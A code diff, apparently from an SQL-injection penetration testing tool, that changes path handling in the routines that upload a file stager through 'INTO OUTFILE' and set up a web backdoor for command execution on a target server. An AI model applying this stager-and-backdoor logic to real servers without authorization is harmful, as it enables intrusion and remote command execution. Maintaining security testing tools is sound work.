@@ -128,7 +128,7 @@ class Web:
             return False
 
     def _webFileInject(self, fileContent, fileName, directory):
-        outFile = posixpath.normpath("%s/%s" % (directory, fileName))
+        outFile = ntToPosixSlashes(os.path.join(directory, fileName))
         uplQuery = getUnicode(fileContent).replace("WRITABLE_DIR", directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory)
         query = ""
 
@@ -217,8 +217,6 @@ class Web:
             else:
                 directory = directory[2:] if isWindowsDriveLetterPath(directory) else directory
 
-            directory = posixpath.normpath(directory)
-
             # Upload the file stager with the LIMIT 0, 1 INTO OUTFILE technique
             infoMsg = "trying to upload the file stager on '%s' " % directory
             infoMsg += "via LIMIT INTO OUTFILE technique"
@@ -228,7 +226,7 @@ class Web:
             for x in list(re.finditer('/', directory)):
                 self.webBaseUrl = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, directory[x.start():])
                 self.webStagerUrl = os.path.join(self.webBaseUrl, stagerName)
-                self.webStagerFilePath = posixpath.normpath(ntToPosixSlashes(os.path.join(directory, stagerName)))
+                self.webStagerFilePath = ntToPosixSlashes(os.path.join(directory, stagerName))
 
                 debugMsg = "trying to see if the file is accessible from %s" % self.webStagerUrl
                 logger.debug(debugMsg)
@@ -266,7 +264,7 @@ class Web:
                     for x in list(re.finditer('/', directory)):
                         self.webBaseUrl = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, directory[x.start():])
                         self.webStagerUrl = os.path.join(self.webBaseUrl, stagerName)
-                        self.webStagerFilePath = ntToPosixSlashes(normalizePath("%s/%s" % (directory, stagerName))).replace("//", "/").rstrip('/')
+                        self.webStagerFilePath = ntToPosixSlashes(os.path.join(directory, stagerName))
 
                         debugMsg = "trying to see if the file is accessible from %s" % self.webStagerUrl
                         logger.debug(debugMsg)
@@ -282,7 +280,7 @@ class Web:
             if not uploaded:
                 self.webBaseUrl = "%s://%s:%d/" % (conf.scheme, conf.hostname, conf.port)
                 self.webStagerUrl = os.path.join(self.webBaseUrl, stagerName)
-                self.webStagerFilePath = posixpath.normpath(ntToPosixSlashes(os.path.join(directory, stagerName)))
+                self.webStagerFilePath = ntToPosixSlashes(os.path.join(directory, stagerName))
 
                 debugMsg = "trying to see if the file is accessible from %s" % self.webStagerUrl
                 logger.debug(debugMsg)
@@ -344,10 +342,10 @@ class Web:
                     else:
                         continue
 
-                self.webBackdoorUrl = "%s/%s" % (self.webBaseUrl, backdoorName)
+                self.webBackdoorUrl = ntToPosixSlashes(os.path.join(self.webBaseUrl, backdoorName))
                 self.webDirectory = directory
 
-            self.webBackdoorFilePath = ntToPosixSlashes(normalizePath("%s/%s" % (directory, backdoorName))).replace("//", "/").rstrip('/')
+            self.webBackdoorFilePath = ntToPosixSlashes(os.path.join(directory, backdoorName))
 
             testStr = "command execution test"
             output = self.webBackdoorRunCmd("echo %s" % testStr)
